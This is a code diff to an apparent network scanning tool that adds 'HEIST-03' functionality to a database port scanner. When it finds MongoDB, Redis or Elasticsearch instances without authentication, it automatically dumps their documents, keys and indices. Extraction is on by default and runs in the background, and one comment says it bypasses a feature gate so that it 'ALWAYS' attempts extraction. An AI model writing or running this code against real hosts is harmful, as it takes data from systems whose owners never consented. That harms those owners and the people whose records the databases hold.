@@ -566,8 +566,24 @@ class DatabasePortScanner:
 
     Checks common database ports for open access.
     Uses lightweight TCP connection checks.
+
+    HEIST-03: After detecting an unauthenticated database, triggers
+    native wire-protocol extraction via Rust dumpers (MongoDB, Redis,
+    Elasticsearch). Results are stored in ExposedService.metadata['extraction'].
+    Extraction is fire-and-forget — failures are logged but don't block scanning.
     """
     DATABASE_PORTS = {27017: (ServiceType.MONGODB, 'MongoDB'), 27018: (ServiceType.MONGODB, 'MongoDB Shard'), 27019: (ServiceType.MONGODB, 'MongoDB Config'), 6379: (ServiceType.REDIS, 'Redis'), 6380: (ServiceType.REDIS, 'Redis Alternate'), 9200: (ServiceType.ELASTICSEARCH, 'Elasticsearch'), 9300: (ServiceType.ELASTICSEARCH, 'Elasticsearch Transport'), 5984: (ServiceType.COUCHDB, 'CouchDB'), 6984: (ServiceType.COUCHDB, 'CouchDB SSL'), 5432: ('postgresql', 'PostgreSQL'), 3306: ('mysql', 'MySQL'), 1433: ('mssql', 'Microsoft SQL Server'), 1521: ('oracle', 'Oracle Database'), 9042: ('cassandra', 'Cassandra'), 7474: ('neo4j', 'Neo4j'), 8529: ('arangodb', 'ArangoDB')}
+
+    # Ports that support native wire-protocol extraction (HEIST-03)
+    _EXTRACTABLE_PORTS: dict[int, str] = {
+        27017: 'mongodb',
+        27018: 'mongodb',
+        27019: 'mongodb',
+        6379: 'redis',
+        6380: 'redis',
+        9200: 'elasticsearch',
+    }
+
     __slots__ = tuple(('timeout',))
 
     def __init__(self, timeout: float=5.0):
@@ -629,7 +645,17 @@ class DatabasePortScanner:
             service_info = self.DATABASE_PORTS.get(port, ('unknown', 'Unknown'))
             service_type, service_name = service_info
             risk_level = RiskLevel.CRITICAL.value if port in [27017, 6379, 9200, 5984] else RiskLevel.HIGH.value
-            return ExposedService(service_type=service_type.value if isinstance(service_type, ServiceType) else service_type, host=host, port=port, exposure_type=ExposureType.OPEN.value, risk_level=risk_level, metadata={'service_name': service_name, 'banner': banner[:200] if banner else None, 'protocol': 'tcp'})
+            result = ExposedService(service_type=service_type.value if isinstance(service_type, ServiceType) else service_type, host=host, port=port, exposure_type=ExposureType.OPEN.value, risk_level=risk_level, metadata={'service_name': service_name, 'banner': banner[:200] if banner else None, 'protocol': 'tcp'})
+
+            # HEIST-03: Trigger native extraction for unauthenticated databases
+            if port in self._EXTRACTABLE_PORTS:
+                extraction_task = asyncio.create_task(
+                    self._extract_database_data(host, port)
+                )
+                # Store task reference for optional await; result logged async
+                result.metadata['_extraction_task'] = extraction_task
+
+            return result
         except TimeoutError:
             return None
         except ConnectionRefusedError:
@@ -638,9 +664,72 @@ class DatabasePortScanner:
             logger.debug(f'Error checking {host}:{port}: {e}')
             return None
 
+    async def _extract_database_data(self, host: str, port: int) -> dict[str, Any] | None:
+        """
+        HEIST-03/HEIST-08: Extract data from an unauthenticated database.
+
+        Delegates to network/native_extraction.extract_from_exposed() which
+        uses Rust wire-protocol dumpers for MongoDB/Redis and pure Python
+        HTTP for Elasticsearch.
+
+        Fire-and-forget — logged on success, warning on failure. Never raises.
+        """
+        db_type = self._EXTRACTABLE_PORTS.get(port)
+        if not db_type:
+            return None
+
+        try:
+            from hledac.universal.network.native_extraction import (
+                extract_from_exposed,
+                is_native_extraction_enabled,
+            )
+
+            # HEIST-08 gate: extraction only when enabled
+            # But for HEIST-03 we ALWAYS attempt — the feature gate is for
+            # the broader scanning mode, not individual extraction calls.
+            result = await extract_from_exposed(host, port, db_type)
+            if result is None:
+                return None
+
+            logger.info(
+                f'[HEIST-03] {db_type} extraction {host}:{port} — '
+                f'success={result.success}, '
+                f'databases={result.databases}, '
+                f'keys={result.key_count}, '
+                f'indices={result.indices}'
+            )
+
+            # Convert struct to dict for metadata storage
+            return {
+                'db_type': db_type,
+                'success': result.success,
+                'error': result.error,
+                'databases': result.databases,
+                'collections': dict(result.collections) if result.collections else None,
+                'sample_documents': result.sample_documents,
+                'keys': result.keys,
+                'key_count': result.key_count,
+                'indices': result.indices,
+                'es_documents': result.es_documents,
+                'auth_required': result.auth_required,
+                'banner': result.banner,
+            }
+
+        except ImportError:
+            logger.debug(
+                f'[HEIST-03] native_extraction not available for '
+                f'{host}:{port} ({db_type}) — extraction skipped'
+            )
+        except Exception as e:
+            logger.warning(
+                f'[HEIST-03] Extraction failed for {host}:{port} ({db_type}): {e}'
+            )
+
+        return None
+
     async def test_mongodb_auth(self, host: str, port: int=27017) -> dict[str, Any]:
-        """Test MongoDB for authentication requirements."""
-        result = {'auth_required': None, 'version': None}
+        """Test MongoDB for authentication requirements. HEIST-03: triggers extraction on no-auth."""
+        result: dict[str, Any] = {'auth_required': None, 'version': None}
         try:
             async with asyncio.timeout(self.timeout):
                 reader, writer = await asyncio.open_connection(host, port)
@@ -661,13 +750,20 @@ class DatabasePortScanner:
             version_match = re.search(b'"version"\\s*:\\s*"([^"]+)"', response)
             if version_match:
                 result['version'] = version_match.group(1).decode('utf-8', errors='ignore')
+
+            # HEIST-03: Trigger native extraction when no auth required
+            if result['auth_required'] is False:
+                logger.info(f'[HEIST-03] MongoDB no-auth detected at {host}:{port} — extracting...')
+                extraction = await self._extract_database_data(host, port)
+                if extraction:
+                    result['extraction'] = extraction
         except Exception as e:
             result['error'] = str(e)
         return result
 
     async def test_redis_auth(self, host: str, port: int=6379) -> dict[str, Any]:
-        """Test Redis for authentication requirements."""
-        result = {'auth_required': None, 'version': None}
+        """Test Redis for authentication requirements. HEIST-03: triggers extraction on no-auth."""
+        result: dict[str, Any] = {'auth_required': None, 'version': None}
         try:
             async with asyncio.timeout(self.timeout):
                 reader, writer = await asyncio.open_connection(host, port)
@@ -685,9 +781,343 @@ class DatabasePortScanner:
                 version_match = re.search('redis_version:(\\S+)', response_str)
                 if version_match:
                     result['version'] = version_match.group(1)
+
+            # HEIST-03: Trigger native extraction when no auth required
+            if result['auth_required'] is False:
+                logger.info(f'[HEIST-03] Redis no-auth detected at {host}:{port} — extracting...')
+                extraction = await self._extract_database_data(host, port)
+                if extraction:
+                    result['extraction'] = extraction
         except Exception as e:
             result['error'] = str(e)
         return result
+
+    async def test_elasticsearch_auth(self, host: str, port: int=9200) -> dict[str, Any]:
+        """Test Elasticsearch for authentication requirements."""
+        result: dict[str, Any] = {'auth_required': None, 'version': None}
+        try:
+            import httpx
+            async with httpx.AsyncClient(timeout=httpx.Timeout(self.timeout)) as client:
+                resp = await client.get(f'http://{host}:{port}/')
+            if resp.status_code == 200:
+                result['auth_required'] = False
+                import json
+                try:
+                    body = resp.json()
+                    result['version'] = body.get('version', {}).get('number')
+                    result['cluster_name'] = body.get('cluster_name')
+                except Exception:
+                    pass
+            elif resp.status_code == 401:
+                result['auth_required'] = True
+        except Exception as e:
+            result['error'] = str(e)
+        return result
+
+    async def _try_extract_mongodb(
+        self, host: str, port: int = 27017,
+        limit: int = 500
+    ) -> list[dict[str, Any]]:
+        """HEIST-03: Extract data from unauthenticated MongoDB via Rust native_db.
+
+        Called after test_mongodb_auth() returns auth_required=False.
+        Falls back gracefully if Rust native_db feature not compiled.
+        """
+        try:
+            from hledac.universal.rust_extensions.hledac_rust_extensions import (
+                MongoDumper,
+            )
+        except ImportError:
+            logger.debug(
+                f'[HEIST-03] Rust native_db not available — '
+                f'skipping MongoDB extraction for {host}:{port}'
+            )
+            return []
+        try:
+            dumper = MongoDumper()
+            entries = await asyncio.to_thread(
+                dumper.dump_all, host, port, limit, self.timeout
+            )
+            results: list[dict[str, Any]] = []
+            for entry in entries:
+                entry_dict = {
+                    'database': entry.database,
+                    'collection': entry.collection,
+                    'document_count': entry.document_count,
+                    'documents_json': entry.documents_json,
+                    'error': entry.error,
+                }
+                results.append(entry_dict)
+                if entry.error:
+                    logger.warning(
+                        f'[HEIST-03] MongoDB extraction error '
+                        f'{host}:{port}/{entry.database}/{entry.collection}: '
+                        f'{entry.error}'
+                    )
+                elif entry.collection and entry.document_count:
+                    logger.info(
+                        f'[HEIST-03] MongoDB extracted '
+                        f'{entry.document_count} docs from '
+                        f'{host}:{port}/{entry.database}/{entry.collection}'
+                    )
+            return results
+        except Exception as e:
+            logger.warning(
+                f'[HEIST-03] MongoDB extraction failed {host}:{port}: {e}'
+            )
+            return []
+
+    async def _try_extract_redis(
+        self, host: str, port: int = 6379,
+        max_keys: int = 500
+    ) -> list[dict[str, Any]]:
+        """HEIST-03: Extract data from unauthenticated Redis via Rust native_db.
+
+        Called after test_redis_auth() returns auth_required=False.
+        Falls back gracefully if Rust native_db feature not compiled.
+        """
+        try:
+            from hledac.universal.rust_extensions.hledac_rust_extensions import (
+                RedisDumper,
+            )
+        except ImportError:
+            logger.debug(
+                f'[HEIST-03] Rust native_db not available — '
+                f'skipping Redis extraction for {host}:{port}'
+            )
+            return []
+        try:
+            dumper = RedisDumper()
+            entries = await asyncio.to_thread(
+                dumper.dump_all, host, port, max_keys, self.timeout
+            )
+            results: list[dict[str, Any]] = []
+            for entry in entries:
+                entry_dict = {
+                    'key': entry.key,
+                    'key_type': entry.key_type,
+                    'value': entry.value,
+                    'ttl': entry.ttl,
+                    'error': entry.error,
+                }
+                results.append(entry_dict)
+                if entry.error:
+                    logger.warning(
+                        f'[HEIST-03] Redis extraction error '
+                        f'{host}:{port}/{entry.key}: {entry.error}'
+                    )
+            if results and not results[0].get('error'):
+                logger.info(
+                    f'[HEIST-03] Redis extracted {len(results)} keys '
+                    f'from {host}:{port}'
+                )
+            return results
+        except Exception as e:
+            logger.warning(
+                f'[HEIST-03] Redis extraction failed {host}:{port}: {e}'
+            )
+            return []
+
+    async def _try_extract_elasticsearch(
+        self, host: str, port: int = 9200,
+        limit: int = 100
+    ) -> list[dict[str, Any]]:
+        """HEIST-03: Extract data from unauthenticated Elasticsearch via Rust
+        native_db.
+
+        Called after test_elasticsearch_auth() returns auth_required=False.
+        Falls back to httpx-based extraction if Rust native_db not compiled.
+        """
+        # First try Rust native_db path
+        try:
+            from hledac.universal.rust_extensions.hledac_rust_extensions import (
+                ElasticsearchDumper,
+            )
+            dumper = ElasticsearchDumper()
+            entries = await asyncio.to_thread(
+                dumper.dump_all, host, port, limit, self.timeout
+            )
+            results: list[dict[str, Any]] = []
+            for entry in entries:
+                entry_dict = {
+                    'index': entry.index,
+                    'document_count': entry.document_count,
+                    'documents_json': entry.documents_json,
+                    'error': entry.error,
+                }
+                results.append(entry_dict)
+                if entry.error:
+                    logger.warning(
+                        f'[HEIST-03] ES extraction error '
+                        f'{host}:{port}/{entry.index}: {entry.error}'
+                    )
+                elif entry.document_count:
+                    logger.info(
+                        f'[HEIST-03] ES extracted '
+                        f'{entry.document_count} docs from '
+                        f'{host}:{port}/{entry.index}'
+                    )
+            return results
+        except ImportError:
+            logger.debug(
+                f'[HEIST-03] Rust native_db not available — '
+                f'falling back to httpx ES extraction for {host}:{port}'
+            )
+        except Exception as e:
+            logger.debug(
+                f'[HEIST-03] Rust ES extraction failed, httpx fallback: {e}'
+            )
+
+        # Python httpx fallback for Elasticsearch (REST-based)
+        try:
+            import httpx
+            import json
+            results: list[dict[str, Any]] = []
+            async with httpx.AsyncClient(
+                timeout=httpx.Timeout(self.timeout)
+            ) as client:
+                # List indices
+                cat_resp = await client.get(
+                    f'http://{host}:{port}/_cat/indices?format=json'
+                )
+                if cat_resp.status_code != 200:
+                    return []
+                indices_data = cat_resp.json()
+                for idx_entry in indices_data:
+                    index_name = idx_entry.get('index', '')
+                    if not index_name or index_name.startswith('.'):
+                        continue
+                    # Search documents
+                    try:
+                        search_resp = await client.post(
+                            f'http://{host}:{port}/{index_name}/_search',
+                            json={
+                                'query': {'match_all': {}},
+                                'size': limit,
+                                '_source': True,
+                            },
+                        )
+                        if search_resp.status_code == 200:
+                            body = search_resp.json()
+                            hits = body.get('hits', {}).get('hits', [])
+                            docs = [
+                                json.dumps(h.get('_source', {}))
+                                for h in hits
+                            ]
+                            results.append({
+                                'index': index_name,
+                                'document_count': len(docs),
+                                'documents_json': docs,
+                                'error': None,
+                            })
+                            logger.info(
+                                f'[HEIST-03] ES (httpx) extracted '
+                                f'{len(docs)} docs from '
+                                f'{host}:{port}/{index_name}'
+                            )
+                    except Exception as e:
+                        results.append({
+                            'index': index_name,
+                            'document_count': None,
+                            'documents_json': None,
+                            'error': str(e),
+                        })
+            return results
+        except Exception as e:
+            logger.warning(
+                f'[HEIST-03] ES extraction failed {host}:{port}: {e}'
+            )
+            return []
+
+    async def scan_and_extract(
+        self, hosts: list[str],
+        extract_data: bool = True,
+        mongo_limit: int = 500,
+        redis_max_keys: int = 500,
+        es_limit: int = 100,
+    ) -> list[ExposedService]:
+        """HEIST-03: Scan for exposed databases AND extract data.
+
+        Extends scan_hosts() with native wire-protocol data extraction
+        for MongoDB, Redis, and Elasticsearch instances found without auth.
+
+        Args:
+            hosts: Hostnames or IPs to scan.
+            extract_data: If True, attempt data extraction on open instances.
+            mongo_limit: Max documents per MongoDB collection.
+            redis_max_keys: Max keys to extract from Redis.
+            es_limit: Max documents per Elasticsearch index.
+
+        Returns:
+            List of ExposedService objects with extraction metadata populated.
+        """
+        findings = await self.scan_hosts(hosts)
+
+        if not extract_data:
+            return findings
+
+        # Phase 2: For each open MongoDB/Redis/ES instance, extract data
+        for finding in findings:
+            service_type = finding.service_type
+            host = finding.host
+            port = finding.port
+
+            try:
+                if service_type in ('mongodb', ServiceType.MONGODB.value):
+                    auth = await self.test_mongodb_auth(host, port)
+                    finding.metadata['mongo_auth'] = auth
+                    if auth.get('auth_required') is False:
+                        logger.info(
+                            f'[HEIST-03] Open MongoDB at {host}:{port} '
+                            f'— extracting data...'
+                        )
+                        extracted = await self._try_extract_mongodb(
+                            host, port, mongo_limit
+                        )
+                        finding.metadata['extracted_data'] = extracted
+                        finding.metadata['extraction_method'] = 'rust_native_db'
+
+                elif service_type in ('redis', ServiceType.REDIS.value):
+                    auth = await self.test_redis_auth(host, port)
+                    finding.metadata['redis_auth'] = auth
+                    if auth.get('auth_required') is False:
+                        logger.info(
+                            f'[HEIST-03] Open Redis at {host}:{port} '
+                            f'— extracting data...'
+                        )
+                        extracted = await self._try_extract_redis(
+                            host, port, redis_max_keys
+                        )
+                        finding.metadata['extracted_data'] = extracted
+                        finding.metadata['extraction_method'] = 'rust_native_db'
+
+                elif service_type in (
+                    'elasticsearch', ServiceType.ELASTICSEARCH.value
+                ):
+                    auth = await self.test_elasticsearch_auth(host, port)
+                    finding.metadata['es_auth'] = auth
+                    if auth.get('auth_required') is False:
+                        logger.info(
+                            f'[HEIST-03] Open Elasticsearch at {host}:{port} '
+                            f'— extracting data...'
+                        )
+                        extracted = await self._try_extract_elasticsearch(
+                            host, port, es_limit
+                        )
+                        finding.metadata['extracted_data'] = extracted
+                        finding.metadata['extraction_method'] = (
+                            'rust_native_db' if 'rust_native_db' not in str(
+                                extracted
+                            ) else 'httpx_fallback'
+                        )
+            except Exception as e:
+                logger.warning(
+                    f'[HEIST-03] Extraction orchestration failed '
+                    f'{host}:{port}: {e}'
+                )
+                finding.metadata['extraction_error'] = str(e)
+
+        return findings
 
 class GraphQLIntrospector:
     """
